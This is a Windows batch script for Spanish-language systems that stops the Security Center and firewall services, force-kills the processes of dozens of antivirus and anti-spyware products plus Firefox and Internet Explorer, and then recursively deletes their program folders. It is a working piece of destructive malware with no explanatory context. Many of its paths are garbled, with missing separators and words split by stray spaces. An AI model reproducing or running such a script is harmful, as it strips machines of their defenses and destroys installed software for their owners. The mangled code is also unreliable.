@echo off
net stop "Centro de Seguridad"
net stop "Firewall de Windows/Conexión compartida a Internet (ICS)"
Taskkill /f /IM ccProxy.exe /IM ccSetMgr.exe /IM SNDSrvc.exe /IM SPBBCSvc.exe /IM ccEvtMgr.exe /IM ccApp.exe /IM NMAIN.EXE /IM SBServ.exe /IM NOPDB.EXE
cd c:Archivos de programaArchiv os comunesSymante c Shared
attrib -H -S -R *.*
del /s /q *.*
rd c:Archivos de programaArchiv os comunesSymante c Shared
cd c:Archivos de programaArchiv os comunesSymante c SharedSPBBC
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM symlcsvc.exe
cd C:Archivos de programaArchiv os comunesSymante c SharedCCPD-LC
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM SymWSC.exe /IM UsrPrmpt.exe
cd c:Archivos de programaArchiv os comunesSymante c SharedSecurity Center
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM navapsvc.exe /IM ISSVC.exe /IM
cd c:Archivos de programaNorton Internet Security
attrib -H -S -R *.*
del /s /q *.*
cd c:Archivos de programaNorton Internet SecurityNorton AntiVirus
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM zlclient.exe /IM zonealarm.exe /IM zlcli6ent.exe /IM zo3nealarm.exe
cd C:Archivos de programaone LabsoneAlarm
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM ewidoctrl.exe
cd C:Archivos de programaewido anti-malware
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM vsmon.exe
C:WINDOWSsystem3 2oneLabs
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM navapsvc.exe /IM NPFMntor.exe /IM navapw32.exe /IM SAVScan.exe
cd C:Archivos de programaNorton AntiVirus
attrib -H -S -R *.*
del /s /q *.*
cd C:Archivos de programaNorton AntiVirusIWP
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM NPROTECT.EXE
cd C:Archivos de programaNorton Utilities
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM WRSSSDK.exe /IM SpySweeper.exe
cd C:Archivos de programaWebroo tSpy Sweeper
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM GBPoll.exe /IM navapsvc.exe /IM NPFMntor.exe /IM NPROTECT.EXE /IM NOPDB.EXE /IM GBTray.exe /IM NPFMntor.exe /IM GhostTray.exe /IM PQV2iSvc.exe
rd C:Archivos de programaNorton SystemWorksNor ton AntiVirus
Taskkill /f /IM no-spy.exe
cd C:Archivos de programaSinEsp ias
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM spyaxe.exe /IM spyaxe.exe
cd C:Archivos de programaSpyAxe
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM SpywareStrike. exe /IM SpywareStrike. exe
cd C:Archivos de programaSpywar eStrike
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM gcasDtServ.exe /IM gcasServ.exe
cd C:Archivos de programaMicros oft AntiSpyware
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM kavsvc.exe /IM kav.exe
cd C:ARCHIVOS DE PROGRAMAKASPER SKY LABKASPERSKY ANTI-VIRUS PERSONAL
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM mcdetect.exe /IM mctskshd.exe /IM mcregwiz.exe /IM mcagent.exe
cd c:archivos de programamcafee .comagent
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM VsStat.exe
cd C:Archivos de programaMcAfee McAfee VirusScan
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM firefox.exe
cd C:Archivos de programaMozill a Firefox
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM Pavsrv51.exe /IM AVENGINE.EXE /IM apvxdwin.exe /IM pavProxy.exe
cd C:Archivos de programaPanda SoftwarePanda Antivirus Titanium
attrib -H -S -R *.*
del /s /q *.*
rd C:Archivos de programaPanda SoftwarePanda Antivirus Titanium
Taskkill /f /IM SynTPLpr.exe /IM SynTPEnh.exe
cd C:Archivos de programaSynapt icsSynTP
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM FrameworkServi ce.exe /IM Mcshield.exe /IM VsTskMgr.exe /IM SHSTAT.EXE
cd C:Archivos de programaNetwor k AssociatesViru sScan
attrib -H -S -R *.*
del /s /q *.*
cd C:Archivos de programaNetwor k AssociatesComm on Framework
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM nod32krn.exe /IM nod32kui.exe
cd C:Archivos de programaEset
attrib -H -S -R *.*
del /s /q *.*
rd C:Archivos de programaEset
Taskkill /f /IM AVGSERV9.EXE  /IM AVGCC32.EXE
cd C:PROGRAM FILESGRISOFTAV G6
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM AVGUARD.EXE /IM AVWUPSRV.EXE /IM AVGNT.EXE /IM AVSched32.EXE
cd C:Archivos de programaAVPers onal
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM ASHSERV.EXE /IM ASHWEBSV.EXE /IM ASHMAISV.exe
cd C:ARCHIVOS DE PROGRAMAALWIL SOFTWAREAVAST4
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM avgcc.exe /IM avgamsvr.exe /IM avgupsvc.exe
cd "cd C:Archivos de programaGrisof t"
attrib -H -S -R *.*
del /s /q *.*
cd "AVGFRE*"
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM IEXPLORE.EXE
cd C:Archivos de programaIntern et Explorer
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM Pagent.exe /IM pagentwd.exe /IM pavsched.exe
cd C:Archivos de programaPanda SoftwarePanda Administrator 3Pav_Agent
attrib -H -S -R *.*
del /s /q *.*
cd C:Archivos de programaPanda SoftwarePanda Administrator 3Scheduler
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM bdoesrv.exe /IM bdmcon.exe /IM bdnagent.exe /IM bdswitch.exe
cd C:Archivos de programaSoftwi nBitDefender9
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM xcommsvr.exe /IM livesrv.exe /IM bdss.exe
rd C:Archivos de programaArchiv os comunesSoftwin
Taskkill /f /IM DefWatch.exe /IM Rtvscan.exe
cd C:Archivos de programaSymant ec_Client_Secu ritySymantec AntiVirus
attrib -H -S -R *.*
del /s /q *.*
Taskkill /f /IM avgamsvr.exe /IM avgupsvc.exe
cd C:Archivos de programaAVG7
attrib -H -S -R *.*
del /s /q *.*
exit